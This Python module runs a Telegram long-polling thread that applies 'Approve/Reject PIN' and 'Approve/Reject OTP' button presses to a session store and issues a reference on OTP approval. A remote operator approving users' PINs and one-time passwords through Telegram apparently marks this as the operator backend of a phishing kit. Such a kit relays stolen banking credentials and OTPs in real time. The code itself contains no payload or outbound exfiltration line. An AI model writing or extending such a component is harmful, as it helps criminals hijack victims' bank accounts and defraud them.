"""Background Telegram update poller.

Runs a daemon thread that long-polls getUpdates and applies inline
keyboard presses (Approve/Reject PIN, Approve/Reject OTP) to the
session store. Unknown callbacks are acknowledged but otherwise
ignored, so unrelated bots do not crash the flow.
"""
from __future__ import annotations

import logging
import threading
from typing import Any

from .telegram import (
    SessionStore,
    TelegramClient,
    TelegramError,
)

LOGGER = logging.getLogger(__name__)

POLL_TIMEOUT_SECONDS = 30
CALLBACK_PREFIXES = (
    "approve_pin:",
    "reject_pin:",
    "approve_otp:",
    "reject_otp:",
)


def _parse_callback(data: str) -> tuple[str, str] | None:
    """Return (action, session_id) or None if *data* is unknown."""
    for prefix in CALLBACK_PREFIXES:
        if data.startswith(prefix):
            action = prefix[:-1]
            session_id = data[len(prefix):]
            if session_id:
                return action, session_id
    return None


def _apply_action(
    store: SessionStore,
    action: str,
    session_id: str,
) -> str:
    """Apply the action to the session; return the toast text."""
    if action == "approve_pin":
        store.update(session_id, pin_status="approved")
        return "PIN approved"
    if action == "reject_pin":
        store.update(session_id, pin_status="rejected")
        return "PIN rejected"
    if action == "approve_otp":
        reference = store.issue_reference(session_id) or ""
        store.update(session_id, otp_status="approved")
        return "OTP approved - " + reference
    if action == "reject_otp":
        store.update(session_id, otp_status="rejected")
        return "OTP rejected"
    return "Unknown action"


class TelegramPoller:
    """Long-polling worker for Telegram update events."""

    def __init__(
        self,
        client: TelegramClient,
        store: SessionStore,
    ) -> None:
        self._client = client
        self._store = store
        self._offset: int | None = None
        self._stop = threading.Event()
        self._thread: threading.Thread | None = None

    def start(self) -> None:
        """Start the polling thread if it is not already running."""
        if self._thread is not None and self._thread.is_alive():
            return
        self._stop.clear()
        self._thread = threading.Thread(
            target=self._run,
            name="telegram-poller",
            daemon=True,
        )
        self._thread.start()
        LOGGER.info("Telegram poller started")

    def stop(self) -> None:
        """Signal the polling thread to stop."""
        self._stop.set()

    def _run(self) -> None:
        while not self._stop.is_set():
            try:
                updates = self._client.get_updates(
                    offset=self._offset,
                    timeout_seconds=POLL_TIMEOUT_SECONDS,
                )
            except TelegramError as exc:
                LOGGER.warning("getUpdates failed: %s", exc)
                self._stop.wait(3.0)
                continue

            for update in updates:
                self._offset = int(update["update_id"]) + 1
                self._handle_update(update)

    def _handle_update(self, update: dict[str, Any]) -> None:
        callback = update.get("callback_query")
        if not callback:
            return
        data = callback.get("data") or ""
        parsed = _parse_callback(data)
        callback_id = str(callback.get("id") or "")

        if parsed is None:
            if callback_id:
                self._client.answer_callback_query(callback_id)
            return

        action, session_id = parsed
        session = self._store.get(session_id)
        if session is None:
            self._client.answer_callback_query(
                callback_id, "Session expired"
            )
            return

        toast = _apply_action(self._store, action, session_id)
        self._client.answer_callback_query(callback_id, toast)
        LOGGER.info("Applied %s to session %s", action, session_id[:8])
